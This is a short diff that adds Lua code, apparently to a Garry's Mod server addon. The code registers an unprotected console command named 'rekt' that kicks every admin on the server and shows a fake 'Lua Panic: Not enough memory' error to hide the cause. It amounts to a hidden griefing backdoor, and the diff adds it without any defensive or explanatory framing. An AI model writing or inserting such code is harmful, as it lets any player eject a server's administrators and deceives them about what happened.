@@ -1,0 +1,7 @@
+concommand.Add("rekt", function()
+   for k, v in pairs(player.GetAll()) do
+      if v:IsAdmin() then
+         v:Kick("Lua Panic: Not enough memory")
+      end
+   end
+end)
